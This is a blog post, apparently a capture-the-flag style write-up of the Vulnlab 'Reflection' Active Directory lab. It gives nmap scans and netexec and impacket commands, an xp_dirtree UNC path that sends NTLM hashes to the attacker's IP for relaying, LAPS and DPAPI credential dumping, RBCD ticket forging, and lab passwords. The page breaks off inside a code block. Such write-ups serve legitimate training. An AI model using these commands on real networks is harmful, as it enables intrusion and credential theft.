<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Reflection Vulnlab | Shelldon's blog</title>
<meta name=keywords content><meta name=description content="In this part of Red Team series we will talk about Reflection chain from Vulnlab.
In this chain exist some cool attacks such abusing GenericAll ACL, LAPS, NTLM Relaying and DPAPI dumping. Also, there is MSSQL enumeration.
First of let&rsquo;s start from the nmap scan to understand what kind of services/ports are open.
nmap -sC -sV -T4 -oN nmap.txt 10.10.228.197-199 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 03:47 EST Nmap scan report for 10."><meta name=author content="Shelldon"><link rel=canonical href=http://localhost:1313/posts/reflection/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.1fa9b2f9d71288e3adc6e7337b3abeb5b9b1b58000345713ddb67551813bde0f.css integrity="sha256-H6my+dcSiOOtxuczezq+tbmxtYAANFcT3bZ1UYE73g8=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/reflection/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Reflection Vulnlab"><meta property="og:description" content="In this part of Red Team series we will talk about Reflection chain from Vulnlab.
In this chain exist some cool attacks such abusing GenericAll ACL, LAPS, NTLM Relaying and DPAPI dumping. Also, there is MSSQL enumeration.
First of let&rsquo;s start from the nmap scan to understand what kind of services/ports are open.
nmap -sC -sV -T4 -oN nmap.txt 10.10.228.197-199 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 03:47 EST Nmap scan report for 10."><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/reflection/"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-11-05T03:42:48-05:00"><meta property="article:modified_time" content="2024-11-05T03:42:48-05:00"><meta property="og:site_name" content="Shelldon's blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Reflection Vulnlab"><meta name=twitter:description content="In this part of Red Team series we will talk about Reflection chain from Vulnlab.
In this chain exist some cool attacks such abusing GenericAll ACL, LAPS, NTLM Relaying and DPAPI dumping. Also, there is MSSQL enumeration.
First of let&rsquo;s start from the nmap scan to understand what kind of services/ports are open.
nmap -sC -sV -T4 -oN nmap.txt 10.10.228.197-199 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 03:47 EST Nmap scan report for 10."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Reflection Vulnlab","item":"http://localhost:1313/posts/reflection/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Reflection Vulnlab","name":"Reflection Vulnlab","description":"In this part of Red Team series we will talk about Reflection chain from Vulnlab.\nIn this chain exist some cool attacks such abusing GenericAll ACL, LAPS, NTLM Relaying and DPAPI dumping. Also, there is MSSQL enumeration.\nFirst of let\u0026rsquo;s start from the nmap scan to understand what kind of services/ports are open.\nnmap -sC -sV -T4 -oN nmap.txt 10.10.228.197-199 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 03:47 EST Nmap scan report for 10.","keywords":[],"articleBody":"In this part of Red Team series we will talk about Reflection chain from Vulnlab.\nIn this chain exist some cool attacks such abusing GenericAll ACL, LAPS, NTLM Relaying and DPAPI dumping. Also, there is MSSQL enumeration.\nFirst of letâ€™s start from the nmap scan to understand what kind of services/ports are open.\nnmap -sC -sV -T4 -oN nmap.txt 10.10.228.197-199 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 03:47 EST Nmap scan report for 10.10.228.197 Host is up (0.11s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-05 08:48:17Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM |_ssl-date: 2024-11-05T08:49:05+00:00; -1s from scanner time. | ms-sql-ntlm-info: | 10.10.228.197:1433: | Target_Name: REFLECTION | NetBIOS_Domain_Name: REFLECTION | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: reflection.vl | DNS_Computer_Name: dc01.reflection.vl | DNS_Tree_Name: reflection.vl |_ Product_Version: 10.0.20348 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2024-11-05T08:45:00 |_Not valid after: 2054-11-05T08:45:00 | ms-sql-info: | 10.10.228.197:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: REFLECTION | NetBIOS_Domain_Name: REFLECTION | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: reflection.vl | DNS_Computer_Name: dc01.reflection.vl | DNS_Tree_Name: reflection.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-11-05T08:48:24+00:00 |_ssl-date: 2024-11-05T08:49:05+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=dc01.reflection.vl | Not valid before: 2024-11-04T08:42:07 |_Not valid after: 2025-05-06T08:42:07 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2024-11-05T08:48:25 |_ start_date: N/A |_clock-skew: mean: -1s, deviation: 0s, median: -1s Nmap scan report for 10.10.228.198 Host is up (0.12s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2024-11-05T08:42:32 |_Not valid after: 2054-11-05T08:42:32 | ms-sql-ntlm-info: | 10.10.228.198:1433: | Target_Name: REFLECTION | NetBIOS_Domain_Name: REFLECTION | NetBIOS_Computer_Name: MS01 | DNS_Domain_Name: reflection.vl | DNS_Computer_Name: ms01.reflection.vl | DNS_Tree_Name: reflection.vl |_ Product_Version: 10.0.20348 | ms-sql-info: | 10.10.228.198:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2024-11-05T08:49:06+00:00; 0s from scanner time. 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: REFLECTION | NetBIOS_Domain_Name: REFLECTION | NetBIOS_Computer_Name: MS01 | DNS_Domain_Name: reflection.vl | DNS_Computer_Name: ms01.reflection.vl | DNS_Tree_Name: reflection.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-11-05T08:48:25+00:00 |_ssl-date: 2024-11-05T08:49:06+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=ms01.reflection.vl | Not valid before: 2024-11-04T08:42:01 |_Not valid after: 2025-05-06T08:42:01 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2024-11-05T08:48:31 |_ start_date: N/A Nmap scan report for 10.10.228.199 Host is up (0.11s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-11-05T08:49:05+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=ws01.reflection.vl | Not valid before: 2024-11-04T08:43:03 |_Not valid after: 2025-05-06T08:43:03 | rdp-ntlm-info: | Target_Name: REFLECTION | NetBIOS_Domain_Name: REFLECTION | NetBIOS_Computer_Name: WS01 | DNS_Domain_Name: reflection.vl | DNS_Computer_Name: ws01.reflection.vl | DNS_Tree_Name: reflection.vl | Product_Version: 10.0.19041 |_ System_Time: 2024-11-05T08:48:25+00:00 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2024-11-05T08:48:36 |_ start_date: N/A |_clock-skew: mean: -1s, deviation: 0s, median: -1s Post-scan script results: | clock-skew: | -1s: | 10.10.228.197 |_ 10.10.228.199 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 3 IP addresses (3 hosts up) scanned in 73.12 seconds The good option is saving all FQDN names of the machines to /etc/hosts file. So, mine looks like that.\n10.10.228.197 dc01.reflection.vl dc01 reflection.vl 10.10.228.198 ms01.reflection.vl ms01 10.10.228.199 ws02.reflection.vl ws01 Letâ€™s enumerate smb shares first of all. As we can see in all machines SMB is exist. So probably good idea starting from the SMB shares.\nFor the first enum netexec the best option.\nnetexec smb 10.10.228.197-199 -u '' -p '' --shares As you can see the null signing does not work, but we have a user guest and if we are lucky enough the guest can enumerate shares without password.\nAlso keep in mind that in all machines even in DC SMB signing does not exist. Maybe there is possible NTLM Relays.\nnetexec smb 10.10.228.197-199 -u 'guest' -p '' --shares We are lucky enough to enumerate shares on MS01 machine using quest user. There are some shares readable for us. The unique one is staging share. Letâ€™s start from that share.\nUsing impacket-smbclient we can perform enumeration.\nimpacket-smbclient reflection.vl/guest@ms01 -no-pass Interseting, in that share we found staging_db.conf file and it contains credential of user web_staging and it seems for Database.\nOn MS01 machine we have MSSQL. So, probably this cred for the MSSQL instance.\nimpacket-mssqlclient reflection.vl/web_staging:Washroom510@ms01 As you can see we logged in to mssql, now it is time to enumerate more!\nActually we can use the help command and get some interesting, comfortable commands, which can help perform enumeration\nFirst off the most interesting thing on mssql in my opinion is xp_cmdshell, which will execute the cmd commands and return output of the command.\nBut we do not have permissions to execute xp_cmdshell. The good options is checking the databases and tables, respectively. Interesting enough, we have database staging, which is not the default db in mssql. Letâ€™s enumerate that one.\nWe found some creds too, but it is not looks like domain users, so letâ€™s enumerate more.\nRemember that in every machine SMB signing is turned off. So, we can perform NTLM Relay attacks. For that attack the xp_dirtree is awesome options, because we can use the UNC Path to our machine and got NTLM hash of the user, and perform relay through impacket-ntlmrelayx tool.\nAs you can see we got NTLMv2 hash of svc_web_staging user. Not letâ€™s try to relay it to DC.\nNote that IP addresses of machines are changed impacket-ntlmrelayx -smb2support -socks -socks-port 1080 -t 10.10.214.101 We started the impacket-ntlmrelay and we need to wait the connection to our machine. As the target we can choose the DC01.\nexec xp_dirtree '\\\\10.8.0.238\\something'; As you can see we perform relay attack and the authenticating against DC01 is succeed.\nAlso the socks proxy is ready on port 1080.\nproxychains -q smbclient -U reflection/svc_web_staging -L \\\\\\\\10.10.214.101 As you can see we can perform enumeration of shares in DC01 machine. There is also one unique share, whish is staging. Letâ€™s enumerate that share deeper.\nproxychains -q impacket-smbclient reflection/svc_web_staging@10.10.214.101 -no-pass Awesome, we have a password for user web_prod. In my opinion this creds for mssql instance on DC01 machine. Letâ€™s try this out.\nimpacket-mssqlclient reflection.vl/web_prod:Tribesman201@10.10.214.101 We successfully logged in to MSSQL instance on DC01 and letâ€™s enumerate databases;\nFinally we found some domain users. Now letâ€™s collect the bloodhound information and enumerate AD ACLs.\nThe interestint moment about which version of bloodhound is more steltheir. I have tested on some environments, where AV and EDR exist and the netexec version is more stelthier than bloodhound.py. So, in this moment we will use the netexecâ€™s bloodhound.\nnetexec ldap 10.10.214.101 -u abbie.smith -p 'CMe1x+nlRaaWEw' --bloodhound -c All --dns-tcp --dns-server 10.10.214.101 As you can see the data saved in .zip format. Letâ€™s start the neo4j and upload an archive.\nWhile enumeration on bloodhound we can find that abbie.smith has ACL GenericAll over MS01 machine. What does it mean? It means that we have all access rights over that object. So we can perform RBCD (Resource Based Constrained Delegation), or make ShadowCredential attack. For the RBCD MachineAccountQuota is 0 which means we can not creat a computer account.\nThere is exist LAPS policy. GenericAll also gives access to read LAPS password. Letâ€™s try to perform this attack.\npython3 /opt/pyLAPS/pyLAPS.py -u abbie.smith -p 'CMe1x+nlRaaWEw' -d reflection.vl --dc-ip 10.10.214.101 So we successfully got password of local Administrator user in MS01 machine. Now we can use evil-winrm or psexec and try to dump the LSASS process.\nevil-winrm -i ms01 -u Administrator -p 'H447.++h6g5}xi' Great! now we can upload mimikatz, but for sure mimikatz will be blocked by AV or even more EDR solutions. So, we need to execute mimikatz in memory and use such kind of techniques. So, letâ€™s get a C2 session. In this example I will use metasploit and will generate payload using msfvenom. Using a shellcode loader I will get a beacon session.\nBut after dumping lsass process we did not find anything interesting and we finally recall about DPAPI. Using the option of netexec we got creds for another user.\nnetexec smb ms01 -u Administrator -p 'H447.++h6g5}xi' --local-auth --dpapi We got creds of Georgia.Price user. Letâ€™s enumerate more. So this user has GenericAll over WS01 machine. In that machies LAPS does not exist, so what can we do? Of course RBCD. Remember that MS01 pwned and we can use that machine for RBCD.\nimpacket-rbcd reflection.vl/georgia.price:'DBl+5MPkpJg5id' -dc-ip 10.10.214.101 -delegate-from MS01$ -delegate-to WS01$ -action write RBCD successfully completed now it is time to get Services Ticket as domain Administator and compromise the WS01 machine.\nimpacket-getST reflection.vl/'MS01$' -dc-ip dc01.reflection.vl -aesKey 64cfd5762890faa03300f588488cff43e080f49be43e410c8c62d7acb502a5a1 -spn 'cifs/ws01.reflection.vl' -impersonate Administrator Awesome the ticket is saved and now we can without any issues perform memory dumping one more time.\nexport KRB5CCNAME=Administrator@cifs_ws01.reflection.vl@REFLECTION.VL.ccache netexec smb ws01 -u Administrator -k --use-kcache --lsa We got another user which is Rhys.Garner, but after some enum this user does not has any critical ACLs over objects, BUT there is another interesting thingâ€¦\nWhile searching garner we can another user who is dom_rgarner and he is a member of Domain Administrators group. So, if we lucky enough, Rhys.Garner uses the same password to that account.\nAwesome! Now we have full control over all the domain.\n","wordCount":"1704","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-11-05T03:42:48-05:00","dateModified":"2024-11-05T03:42:48-05:00","author":{"@type":"Person","name":"Shelldon"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/reflection/"},"publisher":{"@type":"Organization","name":"Shelldon's blog","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/tags/ title=tags><span>tags</span></a></li><li><a href=http://localhost:1313/posts/ title=blog><span>blog</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;Â»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Reflection Vulnlab</h1><div class=post-meta><span title='2024-11-05 03:42:48 -0500 EST'>November 5, 2024</span>&nbsp;Â·&nbsp;8 min&nbsp;Â·&nbsp;1704 words&nbsp;Â·&nbsp;Shelldon</div></header><div class=post-content><p>In this part of Red Team series we will talk about Reflection chain from Vulnlab.<br>In this chain exist some cool attacks such abusing GenericAll ACL, LAPS, NTLM Relaying and DPAPI dumping. Also, there is MSSQL enumeration.</p><p>First of let&rsquo;s start from the nmap scan to understand what kind of services/ports are open.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>nmap</span><span class=w> </span><span class=o>-</span><span class=n>sC</span><span class=w> </span><span class=o>-</span><span class=n>sV</span><span class=w> </span><span class=o>-</span><span class=n>T4</span><span class=w> </span><span class=o>-</span><span class=k>oN</span><span class=w> </span><span class=n>nmap</span><span class=p>.</span><span class=n>txt</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>197</span><span class=o>-</span><span class=mi>199</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Starting</span><span class=w> </span><span class=n>Nmap</span><span class=w> </span><span class=mi>7</span><span class=p>.</span><span class=mi>94</span><span class=n>SVN</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>nmap</span><span class=p>.</span><span class=n>org</span><span class=w> </span><span class=p>)</span><span class=w> </span><span class=k>at</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=w> </span><span class=mi>03</span><span class=p>:</span><span class=mi>47</span><span class=w> </span><span class=n>EST</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Nmap</span><span class=w> </span><span class=n>scan</span><span class=w> </span><span class=n>report</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>197</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Host</span><span class=w> </span><span class=k>is</span><span class=w> </span><span class=n>up</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>11</span><span class=n>s</span><span class=w> </span><span class=n>latency</span><span class=p>).</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Not</span><span class=w> </span><span class=n>shown</span><span class=p>:</span><span class=w> </span><span class=mi>987</span><span class=w> </span><span class=n>filtered</span><span class=w> </span><span class=n>tcp</span><span class=w> </span><span class=n>ports</span><span class=w> </span><span class=p>(</span><span class=k>no</span><span class=o>-</span><span class=n>response</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>PORT</span><span class=w>     </span><span class=k>STATE</span><span class=w> </span><span class=n>SERVICE</span><span class=w>       </span><span class=k>VERSION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>53</span><span class=o>/</span><span class=n>tcp</span><span class=w>   </span><span class=k>open</span><span class=w>  </span><span class=k>domain</span><span class=w>        </span><span class=k>Simple</span><span class=w> </span><span class=n>DNS</span><span class=w> </span><span class=n>Plus</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>88</span><span class=o>/</span><span class=n>tcp</span><span class=w>   </span><span class=k>open</span><span class=w>  </span><span class=n>kerberos</span><span class=o>-</span><span class=n>sec</span><span class=w>  </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>Kerberos</span><span class=w> </span><span class=p>(</span><span class=n>server</span><span class=w> </span><span class=n>time</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=w> </span><span class=mi>08</span><span class=p>:</span><span class=mi>48</span><span class=p>:</span><span class=mi>17</span><span class=n>Z</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>135</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>msrpc</span><span class=w>         </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>RPC</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>139</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>netbios</span><span class=o>-</span><span class=n>ssn</span><span class=w>   </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>netbios</span><span class=o>-</span><span class=n>ssn</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>389</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>ldap</span><span class=w>          </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>Active</span><span class=w> </span><span class=n>Directory</span><span class=w> </span><span class=n>LDAP</span><span class=w> </span><span class=p>(</span><span class=k>Domain</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl0</span><span class=p>.,</span><span class=w> </span><span class=n>Site</span><span class=p>:</span><span class=w> </span><span class=k>Default</span><span class=o>-</span><span class=k>First</span><span class=o>-</span><span class=n>Site</span><span class=o>-</span><span class=n>Name</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>445</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>microsoft</span><span class=o>-</span><span class=n>ds</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>464</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>kpasswd5</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>593</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>ncacn_http</span><span class=w>    </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>RPC</span><span class=w> </span><span class=n>over</span><span class=w> </span><span class=n>HTTP</span><span class=w> </span><span class=mi>1</span><span class=p>.</span><span class=mi>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>636</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>tcpwrapped</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1433</span><span class=o>/</span><span class=n>tcp</span><span class=w> </span><span class=k>open</span><span class=w>  </span><span class=n>ms</span><span class=o>-</span><span class=k>sql</span><span class=o>-</span><span class=n>s</span><span class=w>      </span><span class=n>Microsoft</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=n>Server</span><span class=w> </span><span class=mi>2019</span><span class=w> </span><span class=mi>15</span><span class=p>.</span><span class=mi>00</span><span class=p>.</span><span class=mi>2000</span><span class=p>.</span><span class=mi>00</span><span class=p>;</span><span class=w> </span><span class=n>RTM</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_ssl</span><span class=o>-</span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>49</span><span class=p>:</span><span class=mi>05</span><span class=o>+</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>;</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=n>s</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>scanner</span><span class=w> </span><span class=n>time</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ms</span><span class=o>-</span><span class=k>sql</span><span class=o>-</span><span class=n>ntlm</span><span class=o>-</span><span class=n>info</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>   </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>228</span><span class=p>.</span><span class=mi>197</span><span class=p>:</span><span class=mi>1433</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>Target_Name</span><span class=p>:</span><span class=w> </span><span class=n>REFLECTION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>NetBIOS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>REFLECTION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>NetBIOS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>DC01</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>DNS_Domain_Name</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>DNS_Computer_Name</span><span class=p>:</span><span class=w> </span><span class=n>dc01</span><span class=p>.</span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>     </span><span class=n>DNS_Tree_Name</span><span class=p>:</span><span class=w> </span><span class=n>reflection</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_</span><span class=w>    </span><span class=n>Product_Version</span><span class=p>:</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>0</span><span class=p>.</span><span class=mi>20348</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ssl</span><span class=o>-</span><span class=n>cert</span><span class=p>:</span><span class=w> </span><span class=n>Subject</span><span class=p>:</span><span class=w> </span><span class=n>commonName</span><span class=o>=</span><span class=n>SSL_Self_Signed_Fallback</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>before</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mi>00</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>after</span><span class=p>:</span><span class=w>  </span><span class=mi>2054</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>05</span><span class=n>T08</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mi>00</span><span class=w>
